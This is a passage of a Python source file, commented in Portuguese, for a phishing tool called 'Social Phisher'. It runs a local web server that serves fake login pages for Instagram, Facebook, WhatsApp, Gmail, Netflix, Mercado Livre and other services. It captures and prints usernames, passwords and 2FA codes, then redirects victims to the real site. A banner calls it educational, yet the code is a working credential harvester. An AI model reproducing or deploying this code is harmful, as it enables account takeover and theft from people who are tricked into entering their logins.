        print(f"{Colors.GREEN}[+] {Colors.RESET}Credenciais capturadas - {social}: {username}:{password}")
        if code:
            print(f"{Colors.CYAN}[+] {Colors.RESET}Código 2FA: {code}")
        
    def get_redirect_url(self, social):
        # URLs oficiais de redirecionamento para cada rede social
        redirect_urls = {
            "instagram": "https://www.instagram.com/",
            "facebook": "https://www.facebook.com/",
            "tiktok": "https://www.tiktok.com/",
            "kwai": "https://www.kwai.com/",
            "whatsapp": "https://web.whatsapp.com/",
            "mercadolivre": "https://www.mercadolivre.com.br/",
            "shopee": "https://shopee.com.br/",
            "twitter": "https://twitter.com/",
            "youtube": "https://www.youtube.com/",
            "gmail": "https://mail.google.com/",
            "linkedin": "https://www.linkedin.com/",
            "netflix": "https://www.netflix.com/br/",
            "telegram": "https://web.telegram.org/",
            "pinterest": "https://www.pinterest.com/",
            "unknown": "https://www.google.com/"
        }
        
        return redirect_urls.get(social, redirect_urls["unknown"])
        
    def log_message(self, format, *args):
        # Personalizar logs
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = format % args
        log_entry = f"[{timestamp}] {message}\n"
        
        # Salvar log em arquivo
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)
            
        # Exibir log colorido no console
        if "200" in message:
            color = Colors.GREEN
        elif "302" in message:
            color = Colors.CYAN
        elif "404" in message:
            color = Colors.RED
        else:
            color = Colors.YELLOW
            
        print(f"{color}[{timestamp}] {message}{Colors.RESET}")

class SocialPhisher:
    def __init__(self):
        self.host = HOST
        self.port = PORT
        self.httpd = None
        
    def start_server(self):
        try:
            with socketserver.TCPServer((self.host, self.port), PhishingHandler) as httpd:
                self.httpd = httpd
                print(f"{Colors.GREEN}[+] {Colors.RESET}Servidor iniciado em http://{self.host}:{self.port}")
                print(f"{Colors.GREEN}[+] {Colors.RESET}Páginas disponíveis:")
                
                for social, config in SOCIAL_TEMPLATES.items():
                    print(f"{Colors.BLUE}    {config['path']} {Colors.RESET}- {config['brand_name']}")
                
                print(f"\n{Colors.YELLOW}[!] {Colors.RESET}Pressione Ctrl+C para parar o servidor")
                
                try:
                    httpd.serve_forever()
                except KeyboardInterrupt:
                    print(f"\n{Colors.RED}[-] {Colors.RESET}Parando servidor...")
                    
        except Exception as e:
            print(f"{Colors.RED}[-] {Colors.RESET}Erro ao iniciar servidor: {e}")
            
    def get_local_ip(self):
        try:
            # Obter IP local
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
            
    def get_public_ip(self):
        try:
            # Tentar obter IP público
            import requests
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            return "Não disponível"

def main():
    print(f"""{Colors.PURPLE}
    ███████╗ ██████╗  ██████╗██╗ █████╗ ██╗         ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
    ██╔════╝██╔═══██╗██╔════╝██║██╔══██╗██║         ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
    ███████╗██║   ██║██║     ██║███████║██║         ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗
    ╚════██║██║   ██║██║     ██║██╔══██║██║         ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║
    ███████║╚██████╔╝╚██████╗██║██║  ██║███████╗    ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝
    ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
    {Colors.RESET}""")
    
    print(f"{Colors.CYAN}    Social Phisher - Ferramenta educacional para testes de segurança{Colors.RESET}\n")
    
    # Verificar se é root (para portas baixas)
    if os.geteuid() == 0 and PORT < 1024:
        print(f"{Colors.YELLOW}[!] {Colors.RESET}Executando como root para usar porta {PORT}")
    else:
        if PORT < 1024 and os.geteuid() != 0:
            print(f"{Colors.RED}[-] {Colors.RESET}Portas abaixo de 1024 requerem privilégios de root")
            sys.exit(1)
    
    # Mostrar informações de rede
    phisher = SocialPhisher()
    local_ip = phisher.get_local_ip()
    public_ip = phisher.get_public_ip()
    
    print(f"{Colors.BLUE}[*] {Colors.RESET}IP Local: {local_ip}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}IP Público: {public_ip}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}Porta: {PORT}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}Arquivo de dados: {DATA_FILE}\n")
    
    # Iniciar servidor
    phisher.start_server()

if __name__ == "__main__":
    main()
